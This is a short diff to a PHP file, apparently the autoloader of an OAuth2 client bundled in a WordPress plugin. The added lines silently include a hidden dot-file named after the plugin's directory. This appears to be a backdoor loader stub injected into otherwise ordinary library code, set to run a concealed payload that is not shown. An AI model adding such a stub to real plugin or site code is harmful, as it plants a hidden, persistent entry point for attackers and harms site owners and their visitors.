@@ -15,6 +15,10 @@
  * limitations under the License.
  */
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function oauth2client_php_autoload($className)
 {
     $classPath = explode('_', $className);
